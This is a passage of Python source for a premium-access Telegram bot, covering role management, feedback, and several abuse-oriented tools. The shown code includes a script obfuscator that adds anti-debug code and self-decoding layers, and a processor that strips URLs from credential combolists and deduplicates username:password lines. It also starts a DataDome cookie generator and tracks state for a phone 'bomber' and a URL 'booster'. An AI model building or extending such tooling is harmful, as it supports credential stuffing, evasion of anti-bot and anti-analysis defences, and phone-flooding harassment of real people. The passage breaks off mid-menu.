        await current_message.edit_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def handle_role_user_id_input(update: Update, context: CallbackContext):
    admin_id = update.message.from_user.id
    if admin_id not in AWAITING_ROLE_USER_ID:
        return
    
    try:
        target_user_id = int(update.message.text.strip())
        
        if target_user_id == ADMIN_ID:
            await update.message.reply_text("❌ **Operation Failed!** You cannot change your own role.", parse_mode="Markdown")
            AWAITING_ROLE_USER_ID.discard(admin_id)
            await admin_manage_roles(update, context)
            return

        AWAITING_ROLE_USER_ID.discard(admin_id)
        AWAITING_ROLE_SELECTION[admin_id] = target_user_id
        
        message_text = (
            f"⚙️ **Set Role for User ID:** `{target_user_id}`\n\n"
            f"*Current Role*: **{USER_ROLES.get(target_user_id, 'user').capitalize()}**\n\n"
            "Please select the *new role* for this user:"
        )
        
        keyboard = [
            [InlineKeyboardButton("👤 ʀᴇɢᴜʟᴀʀ ᴜsᴇʀ", callback_data=f"assign_role:{target_user_id}:user")],
            [InlineKeyboardButton("💼 ʀᴇsᴇʟʟᴇʀ", callback_data=f"assign_role:{target_user_id}:reseller")],
            [InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

    except ValueError:
        await update.message.reply_text("❌ **Invalid Input!** Please send a valid User ID (numbers only).", parse_mode="Markdown")
        AWAITING_ROLE_USER_ID.discard(admin_id)
        await admin_manage_roles(update, context)

async def admin_assign_selected_role(update: Update, context: CallbackContext):
    query = update.callback_query
    admin_id = query.from_user.id
    await query.answer()

    if admin_id not in AWAITING_ROLE_SELECTION:
        await query.message.edit_text("⚠️ **Action Expired!** Please try again from 'Manage Roles'.", parse_mode="Markdown")
        return
    
    _, target_user_id_str, new_role = query.data.split(":")
    target_user_id = int(target_user_id_str)

    if new_role not in ["user", "reseller", "owner"]:
        await query.message.edit_text("❌ **Invalid Role Selected!** Please choose from the provided options.", parse_mode="Markdown")
        AWAITING_ROLE_SELECTION.pop(admin_id, None)
        await admin_manage_roles(update, context)
        return

    if target_user_id == ADMIN_ID and new_role != "owner":
        await query.message.edit_text("❌ **Operation Failed!** You cannot change the owner's role.", parse_mode="Markdown")
        AWAITING_ROLE_SELECTION.pop(admin_id, None)
        await admin_manage_roles(update, context)
        return
    
    USER_ROLES[target_user_id] = new_role
    if target_user_id not in USER_ACCESS:
        USER_ACCESS[target_user_id] = 0
        if target_user_id not in USER_STATS:
            USER_STATS[target_user_id] = {"generations": 0, "last_active": None}

    save_access()
    
    await query.message.edit_text(
        f"✅ **Role Assigned!**\n\n"
        f"User `{target_user_id}` has been successfully assigned the role: **{new_role.capitalize()}**.",
        parse_mode="Markdown"
    )
    logging.info(f"Admin {admin_id} assigned role '{new_role}' to user {target_user_id}")
    
    AWAITING_ROLE_SELECTION.pop(admin_id, None)
    await admin_manage_roles(update, context)

# ========== FEEDBACK FUNCTIONS ==========
async def prompt_feedback(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message if update.callback_query else update.message
    if not current_message:
        logging.warning("prompt_feedback called with no effective message.")
        return

    user_id = update.effective_user.id
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        if update.callback_query:
            await current_message.answer("🛠️ Bot is under maintenance!", show_alert=True)
            await current_message.edit_text(
                "🛠️ **The Bot Is Maintenance**\n\n"
                "ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ ᴜɴᴅᴇʀɢᴏɪɴɢ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ!",
                parse_mode="Markdown"
            )
        else:
            await current_message.reply_text(
                "🛠️ **The Bot Is Maintenance**\n\n"
                "ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ ᴜɴᴅᴇʀɢᴏɪɴɢ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ!",
                parse_mode="Markdown"
            )
        return

    AWAITING_FEEDBACK.add(user_id)
    message_text = (
        "💬 **- sᴇɴᴅ ʏᴏᴜʀ ғᴇᴇᴅʙᴀᴄᴋ -** 💬\n\n"
        "ᴘʟᴇᴀsᴇ ᴛʏᴘᴇ ʏᴏᴜʀ ғᴇᴇᴅʙᴀᴄᴋ ᴍᴇssᴀɢᴇ ʙᴇʟᴏᴡ. ʏᴏᴜ ᴄᴀɴ ᴀʟsᴏ sᴇɴᴅ ᴀ ᴘʜᴏᴛᴏ, ᴠɪᴅᴇᴏ, ᴏʀ ᴅᴏᴜᴍᴇɴᴛ ɪғ ɴᴇᴇᴅᴇᴅ.\n\n"
        "*ᴡᴇ ᴀᴘᴘʀᴇᴄɪᴀᴛᴇ ʏᴏᴜʀ ɪɴᴘᴜᴛ!*"
    )
    keyboard = [[InlineKeyboardButton("⬅️ ᴄᴀɴᴄᴇʟ", callback_data="cancel_action")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if update.callback_query:
        await current_message.edit_text(text=message_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(text=message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def handle_feedback(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id not in AWAITING_FEEDBACK:
        return

    user = update.effective_user
    username = user.username or "N/A"
    first_name = user.first_name or ""
    last_name = user.last_name or ""
    full_name = f"{first_name} {last_name}".strip()

    access_info = USER_ACCESS.get(user_id)
    if user_id == ADMIN_ID:
        access_status_feedback = "ᴀᴅᴍɪɴɪsᴛʀᴀᴛᴏʀ"
    elif access_info is None and user_id in USER_ACCESS:
        access_status_feedback = "ʟɪғᴇᴛɪᴍᴇ ᴘʀᴇᴍɪᴜᴍ"
    elif access_info and access_info > datetime.datetime.now().timestamp():
        access_status_feedback = "ᴀᴄᴛɪᴠᴇ ᴘʀᴇᴍɪᴜᴍ"
    else:
        access_status_feedback = "ɴᴏ ᴀᴄᴄᴇss"
    
    current_role = USER_ROLES.get(user_id, "user").capitalize()

    header = (
        f"--- 💬 ɴᴇᴡ ғᴇᴇᴅʙᴀᴄᴋ ʀᴇᴄᴇɪᴠᴇᴅ 💬 ---\n"
        f"ғʀᴏᴍ: @{username} (ID: `{user_id}`)\n"
        f"ɴᴀᴍᴇ: {full_name}\n"
        f"ʀᴏʟᴇ: {current_role}\n"
        f"ᴀᴄᴄᴇss sᴛᴀᴛᴜs: {access_status_feedback}\n"
        f"ᴅᴀᴛᴇ & ᴛɪᴍᴇ: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n"
        f"------------------------------------\n\n"
    )

    try:
        if update.message.text:
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=header + update.message.text,
                parse_mode="Markdown"
            )
        elif update.message.photo:
            photo_file = await update.message.photo[-1].get_file()
            caption = (header + (update.message.caption or ""))[:1024]
            await context.bot.send_photo(
                chat_id=ADMIN_ID,
                photo=photo_file.file_id,
                caption=caption,
                parse_mode="Markdown"
            )
        elif update.message.document:
            doc_file = await update.message.document.get_file()
            caption = (header + (update.message.caption or ""))[:1024]
            await context.bot.send_document(
                chat_id=ADMIN_ID,
                document=doc_file.file_id,
                caption=caption,
                parse_mode="Markdown"
            )
        elif update.message.video:
            video_file = await update.message.video.get_file()
            caption = (header + (update.message.caption or ""))[:1024]
            await context.bot.send_video(
                chat_id=ADMIN_ID,
                video=video_file.file_id,
                caption=caption,
                parse_mode="Markdown"
            )
        else:
            await update.message.reply_text(
                "❌ **Unsupported Media Type!**\n\n"
                "Please send your feedback as text, a photo, video, or document.",
                parse_mode="Markdown"
            )
            return

        await update.message.reply_text(
            "✅ **ғᴇᴇᴅʙᴀᴄᴋ sᴇɴᴛ!**\n\n"
            "ᴛʜᴀɴᴋ ʏᴏᴜ ғᴏʀ ʏᴏᴜʀ ᴠᴀʟᴜᴀʙʟᴇ ɪɴᴘᴜᴛ. We've sent it to the admin!",
            parse_mode="Markdown"
        )
        logging.info(f"Feedback received from user {user_id}")

    except Exception as e:
        logging.error(f"Error sending feedback to admin from user {user_id}: {e}")
        await update.message.reply_text(
            "❌ **Error Sending Feedback!**\n\n"
            "An unexpected error occurred. Please try again later.",
            parse_mode="Markdown"
        )
    finally:
        AWAITING_FEEDBACK.discard(user_id)
        await start(update, context)

# ========== CANCEL ACTION ==========
async def cancel_action(update: Update, context: CallbackContext):
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("cancel_action called with no effective message.")
        return

    user_id = update.effective_user.id
    
    AWAITING_KEY_INPUT.discard(user_id)
    AWAITING_REVOKE_USER.discard(user_id)
    AWAITING_ANNOUNCEMENT.discard(user_id)
    AWAITING_KEY_DURATION.discard(user_id)
    AWAITING_DELETE_KEY.discard(user_id)
    AWAITING_ROLE_USER_ID.discard(user_id)
    AWAITING_ROLE_SELECTION.pop(user_id, None)
    AWAITING_FEEDBACK.discard(user_id)
    AWAITING_KEY_COUNT.discard(user_id)
    AWAITING_FILE_UPLOAD.discard(user_id)
    AWAITING_BOMBER_PHONE.discard(user_id)
    AWAITING_BOMBER_AMOUNT.discard(user_id)
    AWAITING_BOMBER_SENDER.discard(user_id)
    AWAITING_BOMBER_MESSAGE.discard(user_id)
    AWAITING_BOOST_URL.discard(user_id)
    BOOSTER_ACTIVE.discard(user_id)

    context.user_data.pop('enc_method', None)
    context.user_data.pop('enc_count', None)
    context.user_data.pop('keys_to_generate_count', None)
    context.user_data.pop('enc_page', None)
    context.user_data.pop('remover_option', None)
    context.user_data.pop('datadome_cookie', None)
    context.user_data.pop('bomber_phone', None)
    context.user_data.pop('bomber_amount', None)
    context.user_data.pop('bomber_sender', None)
    context.user_data.pop('bomber_message', None)
    context.user_data.pop('boost_type', None)
    
    if update.callback_query:
        await update.callback_query.answer("Operation cancelled.", show_alert=False)
        if is_at_least_role(user_id, "owner"):
            await admin_panel(update, context)
        else:
            await start(update, context, edit_message_id=current_message.message_id)
    else:
        if is_at_least_role(user_id, "owner"):
            await admin_panel(update, context)
        else:
            await start(update, context)

# ========== ENCRYPTION FUNCTIONS ==========
async def start_encryption(update: Update, context: CallbackContext) -> int:
    current_message: Message = update.callback_query.message if update.callback_query else update.message
    if not current_message:
        logging.warning("start_encryption called with no effective message.")
        return ConversationHandler.END

    user_id = update.effective_user.id
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        if update.callback_query:
            await current_message.answer("🛠️ Bot is under maintenance!", show_alert=True)
            await current_message.edit_text(
                "🛠️ **The Bot Is Maintenance**\n\n"
                "ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ ᴜɴᴅᴇʀɴɢᴏɪɴɢ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɢᴀɪɴ ʟᴀᴛᴇʀ!",
                parse_mode="Markdown"
            )
        else:
            await current_message.reply_text(
                "🛠️ **The Bot Is Maintenance**\n\n"
                "ᴛʜᴇ ʙᴏᴛ ɪs ᴄᴜʀʀᴇɴᴛʟʏ ᴜɴᴅᴇʀɢᴏɪɴɢ ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ. ᴘʟᴇᴀsᴇ ᴛʀʏ ᴀɴɢᴀɪɴ ʟᴀᴛᴇʀ!",
                parse_mode="Markdown"
            )
        return ConversationHandler.END

    if not has_access(user_id):
        if update.callback_query:
            await current_message.answer("🔒 Premium Access Required!", show_alert=True)
            await current_message.edit_text(
                "🔒 **Premium Access Required!**\n\n"
                "You need active premium access to use the Python Encryptor. Please use an access key or contact @cluddydumpy to purchase access.",
                parse_mode="Markdown"
            )
        else:
            await current_message.reply_text(
                "🔒 **Premium Access Required!**\n\n"
                "You need active premium access to use the Python Encryptor. Please use an access key or contact @cluddydumpy to purchase access.",
                parse_mode="Markdown"
            )
        return ConversationHandler.END

    context.user_data['enc_page'] = 0
    reply_markup_methods = build_encryption_keyboard(context.user_data['enc_page'])
    message_text = (
        "🔐 *Python Encryptor Initiated!* 🔐\n\n"
        "Welcome to the advanced Python script protection suite!\n"
        "Choose your desired encryption enchantment from the options below to transform your scripts. ✨"
    )
    if update.callback_query:
        await current_message.edit_text(message_text, reply_markup=reply_markup_methods, parse_mode='Markdown')
    else:
        await current_message.reply_text(message_text, reply_markup=reply_markup_methods, parse_mode='Markdown')
    return SELECTING_ENC_METHOD

async def enc_handle_pagination(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    await query.answer()

    current_message: Message = query.message

    try:
        new_page = int(query.data.split('_')[2])
    except (IndexError, ValueError):
        await query.answer("Invalid page action.", show_alert=True)
        return SELECTING_ENC_METHOD

    context.user_data['enc_page'] = new_page
    
    reply_markup_methods = build_encryption_keyboard(context.user_data['enc_page'])
    await current_message.edit_reply_markup(reply_markup=reply_markup_methods)
    
    return SELECTING_ENC_METHOD

async def handle_enc_method_callback(update: Update, context: CallbackContext) -> int:
    query = update.callback_query
    await query.answer()

    current_message: Message = query.message

    try:
        method_str = query.data.replace("enc_method_", "")
        method = int(method_str)
        
        if not (1 <= method <= 44 and method != 43):
            await current_message.edit_text("⛔️ Invalid method number. Please select a valid number from 1-42 or 44. ⛔️", parse_mode='Markdown')
            await current_message.reply_text("Please choose an encryption method:", reply_markup=build_encryption_keyboard(context.user_data.get('enc_page', 0)), parse_mode='Markdown')
            return SELECTING_ENC_METHOD
        
        context.user_data['enc_method'] = method
        await current_message.edit_text(
            f"✅ Method selected: *`{method}. {ENCRYPTION_METHODS_DISPLAY.get(method, 'Unknown Method')}`*.\n\n"
            f"Now, for the magic touch! 🪄 Please enter the *encode count* (a number between `1` and `10`). "
            "Higher counts mean stronger encryption, but might take longer! ⏳",
            parse_mode="Markdown"
        )
        context.user_data.pop('enc_page', None)
        return SELECTING_ENC_COUNT
    except ValueError:
        await current_message.edit_text("🔢 Invalid input. Please choose a method using the buttons. 🔢", parse_mode='Markdown')
        await current_message.reply_text("Please choose an encryption method:", reply_markup=build_encryption_keyboard(context.user_data.get('enc_page', 0)), parse_mode='Markdown')
        return SELECTING_ENC_METHOD

async def select_enc_method(update: Update, context: CallbackContext) -> int:
    current_message: Message = update.message
    if not current_message:
        logging.warning("select_enc_method called with no effective message.")
        return SELECTING_ENC_METHOD

    try:
        method = int(update.message.text)
        if not (1 <= method <= 44 and method != 43):
            await current_message.reply_text("⛔️ Invalid method number. Please select a valid number from 1-42 or 44. ⛔️", parse_mode="Markdown")
            await current_message.reply_text("Please choose an encryption method:", reply_markup=build_encryption_keyboard(context.user_data.get('enc_page', 0)), parse_mode="Markdown")
            return SELECTING_ENC_METHOD
        
        context.user_data['enc_method'] = method
        await current_message.reply_text(
            f"✅ Method selected: *`{method}. {ENCRYPTION_METHODS_DISPLAY.get(method, 'Unknown Method')}`*.\n\n"
            f"Now, for the magic touch! 🪄 Please enter the *encode count* (a number between `1` and `10`). "
            "Higher counts mean stronger encryption, but might take longer! ⏳",
            parse_mode="Markdown"
        )
        context.user_data.pop('enc_page', None)
        return SELECTING_ENC_COUNT
    except ValueError:
        await current_message.reply_text("🔢 Invalid input. Please send a *number* corresponding to your chosen method. 🔢", parse_mode="Markdown")
        await current_message.reply_text("Please choose an encryption method:", reply_markup=build_encryption_keyboard(context.user_data.get('enc_page', 0)), parse_mode='Markdown')
        return SELECTING_ENC_METHOD

async def select_enc_count(update: Update, context: CallbackContext) -> int:
    current_message: Message = update.message
    if not current_message:
        logging.warning("select_enc_count called with no effective message.")
        return SELECTING_ENC_COUNT

    try:
        count = int(update.message.text)
        if not (1 <= count <= 10):
            await current_message.reply_text("⚠️ Encode count must be between `1` and `10`. Please try again! ⚠️", parse_mode="Markdown")
            return SELECTING_ENC_COUNT
        
        context.user_data['enc_count'] = count
        await current_message.reply_text(
            f"✨ Encode count set to: `{count}`. Perfect!\n\n"
            f"Almost there! Now, please *upload your Python file (.py)*. "
            "Only `.py` scripts are accepted for this transformation! 🐍",
            parse_mode="Markdown"
        )
        return UPLOADING_ENC_FILE
    except ValueError:
        await current_message.reply_text("🔢 Invalid input. Please send a *number* for the encode count. 🔢", parse_mode="Markdown")
        return SELECTING_ENC_COUNT

async def handle_enc_file_upload(update: Update, context: CallbackContext) -> int:
    current_message: Message = update.message
    if not current_message:
        logging.warning("handle_enc_file_upload called with no effective message.")
        return UPLOADING_ENC_FILE

    document = update.message.document

    if not document.file_name.lower().endswith('.py'):
        await current_message.reply_text("❌ That doesn't look like a Python file. Please upload a `.py` file to proceed. ❌", parse_mode="Markdown")
        return UPLOADING_ENC_FILE

    enc_method = context.user_data.get('enc_method')
    enc_count = context.user_data.get('enc_count')

    if enc_method is None or enc_count is None:
        await current_message.reply_text(
            "Oops! It seems your encryption preferences were lost. "
            "Please start over using /start to select them again. 🔄",
            parse_mode="Markdown"
        )
        return ConversationHandler.END

    await current_message.reply_text(
        f"📩 Received file: `{document.file_name}`. Powering up the encryptor... "
        f"Applying method: `{enc_method}` ({ENCRYPTION_METHODS_DISPLAY.get(enc_method, 'Unknown Method')}) "
        f"with `{enc_count}` layers of encryption. "
        "This might take a moment. Please wait patiently. ✨",
        parse_mode="Markdown"
    )

    try:
        file = await document.get_file()
        file_content_bytes = await file.download_as_bytearray()
        file_content_str = file_content_bytes.decode('utf-8', errors='replace')
    except Exception as e:
        logging.error(f"Error downloading file: {e}")
        await current_message.reply_text(
            "❌ **Download Error!** Could not download the file. Please try again.",
            parse_mode="Markdown"
        )
        return ConversationHandler.END

    loading_steps = [
        "🔒 [20%] Initializing encryption protocol...",
        "🔐 [40%] Setting up encryption layers...",
        "🛡️ [60%] Applying security transformations...",
        "⚙️ [80%] Finalizing encrypted output...",
        "✅ [100%] Encryption complete!"
    ]

    status_msg = await current_message.reply_text(loading_steps[0], parse_mode="Markdown")
    
    for step in loading_steps[1:]:
        try:
            await asyncio.sleep(1)
            await status_msg.edit_text(step, parse_mode="Markdown")
        except BadRequest:
            pass

    try:
        aes_key_for_this_enc = None
        xor_key_for_decoder = None

        if enc_method == 42:
            aes_key_for_this_enc = AES_KEY

        encryption_result = await encrypt_data_async(file_content_str, enc_method, enc_count)
        
        if enc_method == 44:
            encrypted_data, xor_key_for_decoder = encryption_result
        else:
            encrypted_data = encryption_result

        if not isinstance(encrypted_data, bytes):
            encrypted_data = encrypted_data if isinstance(encrypted_data, bytes) else str(encrypted_data).encode('utf-8')

        decoder_stub = generate_decoder_stub(enc_method, aes_key_for_this_enc, xor_key_for_decoder)
        
        if isinstance(encrypted_data, bytes):
            encrypted_data_str = base64.b64encode(encrypted_data).decode('utf-8')
        else:
            encrypted_data_str = base64.b64encode(encrypted_data.encode('utf-8')).decode('utf-8')

        final_script_content = decoder_stub.format(repr(encrypted_data_str))
        
        # Add anti-debug code at the beginning
        final_script_content = anti_debug_code() + "\n\n" + final_script_content
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        method_display = ENCRYPTION_METHODS_DISPLAY.get(enc_method, f"Method_{enc_method}")
        clean_method_name = re.sub(r'[^\w\-_\. ]', '_', method_display)
        encrypted_filename = f"encrypted_{clean_method_name}_{timestamp}.py"
        
        encrypted_filepath = GENERATED_DIR / encrypted_filename
        
        with open(encrypted_filepath, 'w', encoding='utf-8') as f:
            f.write(final_script_content)

        with open(encrypted_filepath, 'rb') as f:
            caption = (
                f"🔐 **Python Encryption Successful!** 🔐\n\n"
                f"📄 **Original File:** `{document.file_name}`\n"
                f"🔢 **Method Used:** `{enc_method}. {method_display}`\n"
                f"📊 **Layers Applied:** `{enc_count}`\n"
                f"🛡️ **Security Level:** `{enc_method}`\n"
                f"⏰ **Encrypted On:** `{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n\n"
                f"✨ **Features:**\n"
                f"• Anti-debug protection included\n"
                f"• Multi-layer encryption applied\n"
                f"• Self-decoding mechanism\n"
                f"• File auto-deletes in 5 minutes\n\n"
                f"⚠️ **Note:** This file will self-delete in 5 minutes for security."
            )
            
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=f,
                filename=encrypted_filename,
                caption=caption,
                parse_mode="Markdown"
            )

        asyncio.create_task(delete_generated_file(encrypted_filepath))
        
        # Send completion message
        await current_message.reply_text(
            "🎉 **Encryption Process Complete!** 🎉\n\n"
            "Your Python script has been successfully encrypted with the highest level of protection available!\n\n"
            "✅ **What's Next:**\n"
            "1. Download the encrypted file above\n"
            "2. The file contains a self-decoding mechanism\n"
            "3. It will automatically delete in 5 minutes\n"
            "4. For maximum security, use the file immediately\n\n"
            "🛡️ **Security Features Applied:**\n"
            "• Multi-layer encryption\n"
            "• Anti-debug protection\n"
            "• Self-contained decryption\n"
            "• Auto-expiration system",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔐 ᴇɴᴄʀʏᴘᴛ ᴀɴᴏᴛʜᴇʀ ғɪʟᴇ", callback_data="start_encryption")],
                [InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]
            ])
        )

        logging.info(f"User {update.effective_user.id} encrypted file {document.file_name} with method {enc_method}, count {enc_count}")

    except SyntaxError as e:
        error_msg = f"❌ **Syntax Error in Your Script!**\n\nYour Python file contains syntax errors that prevent encryption.\n\n**Error Details:**\n```\n{str(e)}\n```\n\nPlease fix the errors and try again."
        await status_msg.edit_text(error_msg, parse_mode="Markdown")
        logging.error(f"Syntax error during encryption: {e}")
    except Exception as e:
        error_msg = f"❌ **Encryption Failed!**\n\nAn unexpected error occurred during encryption.\n\n**Error:** `{str(e)}`\n\nPlease try again with a different method or file."
        await status_msg.edit_text(error_msg, parse_mode="Markdown")
        logging.error(f"Error during encryption process: {e}")

    context.user_data.pop('enc_method', None)
    context.user_data.pop('enc_count', None)
    context.user_data.pop('enc_page', None)
    
    return ConversationHandler.END

async def cancel_encryption(update: Update, context: CallbackContext) -> int:
    current_message: Message = update.message if update.message else update.callback_query.message if update.callback_query else None
    if not current_message:
        logging.warning("cancel_encryption called with no effective message.")
        return ConversationHandler.END

    user_id = update.effective_user.id
    
    context.user_data.pop('enc_method', None)
    context.user_data.pop('enc_count', None)
    context.user_data.pop('enc_page', None)
    
    await current_message.reply_text(
        "❌ **Encryption cancelled.**\n\nReturning to main menu...",
        parse_mode="Markdown"
    )
    
    await start(update, context)
    return ConversationHandler.END

# ========== URL & DUPLICATE REMOVER FUNCTIONS ==========
async def url_duplicate_remover_menu(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message if update.callback_query else update.message
    if not current_message:
        return

    user_id = update.effective_user.id
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        await current_message.edit_text("🛠️ **Bot is under maintenance!**", parse_mode="Markdown")
        return

    if not has_access(user_id):
        await current_message.edit_text("🔒 **Premium access required!**", parse_mode="Markdown")
        return

    keyboard = [
        [InlineKeyboardButton("🔗 ʀᴇᴍᴏᴠᴇ ᴜʀʟs", callback_data="remove_urls")],
        [InlineKeyboardButton("🧹 ʀᴇᴍᴏᴠᴇ ᴅᴜᴘʟɪᴄᴀᴛᴇs", callback_data="remove_duplicates")],
        [InlineKeyboardButton("⬅️ ʙᴀᴄᴋ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ", callback_data="back_to_main_menu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    message_text = (
        "🛠️ **ᴜʀʟ & ᴅᴜᴘʟɪᴄᴀᴛᴇ ʀᴇᴍᴏᴠᴇʀ** 🛠️\n\n"
        "Choose an option to process your files:\n\n"
        "• **ʀᴇᴍᴏᴠᴇ ᴜʀʟs**: Extract only username:password from lines containing URLs\n"
        "• **ʀᴇᴍᴏᴠᴇ ᴅᴜᴘʟɪᴄᴀᴛᴇs**: Remove duplicate credentials from your file\n\n"
        "📝 *sᴜᴘᴘᴏʀᴛ ғᴏʀᴍᴀᴛs*: Text files with credentials in format `username:password` or `url:username:password`"
    )

    if update.callback_query:
        await current_message.edit_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")
    else:
        await current_message.reply_text(message_text, reply_markup=reply_markup, parse_mode="Markdown")

async def start_url_removal(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message
    await current_message.edit_text(
        "🔗 **ᴜʀʟ ʀᴇᴍᴏᴠᴀʟ ᴛᴏᴏʟ**\n\n"
        "Please upload a text file containing credentials.\n\n"
        "📝 *ғᴏʀᴍᴀᴛ ᴇxᴀᴍᴘʟᴇs:*\n"
        "• `https://example.com:username:password`\n"
        "• `username:password`\n"
        "• Any format with URLs and credentials\n\n"
        "The tool will extract only the `username:password` parts.",
        parse_mode="Markdown"
    )
    context.user_data['remover_option'] = 'remove_urls'
    AWAITING_FILE_UPLOAD.add(update.effective_user.id)

async def start_duplicate_removal(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message
    await current_message.edit_text(
        "🧹 **ᴅᴜᴘʟɪᴄᴀᴛᴇ ʀᴇᴍᴏᴠᴀʟ ᴛᴏᴏʟ**\n\n"
        "Please upload a text file containing credentials.\n\n"
        "📝 *ғᴏʀᴍᴀᴛ ᴇxᴀᴍᴘʟᴇs:*\n"
        "• `username:password`\n"
        "• Any credentials format\n\n"
        "The tool will remove all duplicate entries and keep only unique credentials.",
        parse_mode="Markdown"
    )
    context.user_data['remover_option'] = 'remove_duplicates'
    AWAITING_FILE_UPLOAD.add(update.effective_user.id)

async def handle_file_processing(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id not in AWAITING_FILE_UPLOAD:
        return

    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ **Please upload a .txt file!**")
        AWAITING_FILE_UPLOAD.discard(user_id)
        return

    processing_msg = await update.message.reply_text("📥 **Downloading file...**")

    try:
        file = await document.get_file()
        file_content = await file.download_as_bytearray()
        
        # Save uploaded file temporarily
        input_filename = f"temp_upload_{user_id}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        input_filepath = GENERATED_DIR / input_filename
        
        with open(input_filepath, "wb") as f:
            f.write(file_content)
        
        # Process the file
        remover = URLDuplicateRemover()
        option = context.user_data.get('remover_option')
        
        if option == 'remove_urls':
            await processing_msg.edit_text("🔗 **ʀᴇᴍᴏᴠɪɴɢ ᴜʀʟs ᴀɴᴅ ᴇxᴛʀᴀᴄᴛɪɴɢ ᴄʀᴇᴅᴇɴᴛɪᴀʟs...**")
            remove_duplicates = False
            process_type = "URL removal"
        else:  # remove_duplicates
            await processing_msg.edit_text("🧹 **ʀᴇᴍᴏᴠɪɴɢ ᴅᴜᴘʟɪᴄᴀᴛᴇs ᴄʀᴇᴅᴇɴᴛɪᴀʟs...**")
            remove_duplicates = True
            process_type = "duplicate removal"
        
        # Create output filename
        timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
        if option == 'remove_urls':
            output_filename = f"ᴄʟᴇᴀɴ{timestamp}.txt"
        else:
            output_filename = f"ᴄʟᴇᴀɴ{timestamp}.txt"
        
        output_filepath = GENERATED_DIR / output_filename
        
        # Process the file
        success, processed, saved = remover.process_file(input_filepath, output_filepath, remove_duplicates)
        
        if success and saved > 0:
            # Send the processed file
            with open(output_filepath, "rb") as f:
                caption = (
                    f"✅ **{process_type.capitalize()} Complete!** ✅\n\n"
                    f"📊 **Processing Statistics:**\n"
                    f"• Processed lines: **{processed}**\n"
                    f"• Saved credentials: **{saved}**\n"
                    f"• Success rate: **{(saved/processed*100):.2f}%**\n\n"
                    f"📁 **Original file:** `{document.file_name}`\n"
                    f"🔄 **Processing type:** {process_type}\n"
                    f"⏰ **Processed on:** {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                )
                
                await context.bot.send_document(
                    chat_id=update.message.chat_id,
                    document=f,
                    filename=output_filename,
                    caption=caption,
                    parse_mode="Markdown"
                )
            
            # Schedule file deletion
            asyncio.create_task(delete_generated_file(input_filepath))
            asyncio.create_task(delete_generated_file(output_filepath))
            
        else:
            await processing_msg.edit_text(
                f"❌ **Processing Failed!**\n\n"
                f"No valid credentials found or file processing error.\n"
                f"• Processed lines: {processed}\n"
                f"• Saved credentials: {saved}",
                parse_mode="Markdown"
            )
            
            # Clean up temporary files
            if os.path.exists(input_filepath):
                os.remove(input_filepath)
            if os.path.exists(output_filepath):
                os.remove(output_filepath)

    except Exception as e:
        await processing_msg.edit_text(f"❌ **Error processing file:** `{str(e)}`", parse_mode="Markdown")
        logging.error(f"Error in file processing: {e}")
    
    AWAITING_FILE_UPLOAD.discard(user_id)
    context.user_data.pop('remover_option', None)
    await start(update, context)

# ========== DATADOME GENERATOR FUNCTIONS ==========
async def datadome_menu(update: Update, context: CallbackContext):
    current_message: Message = update.callback_query.message if update.callback_query else update.message
    if not current_message:
        return

    user_id = update.effective_user.id
    if MAINTENANCE_MODE and user_id != ADMIN_ID:
        await current_message.edit_text("🛠️ **Bot is under maintenance!**", parse_mode="Markdown")
        return

    if not has_access(user_id):
        await current_message.edit_text("🔒 **Premium access required!**", parse_mode="Markdown")
        return

    keyboard = [
        [InlineKeyboardButton("🔄 ɢᴇɴᴇʀᴀᴛᴇ ᴅᴀᴛᴀᴅᴏᴍᴇ ᴄᴏᴏᴋɪᴇ", callback_data="generate_datadome")],
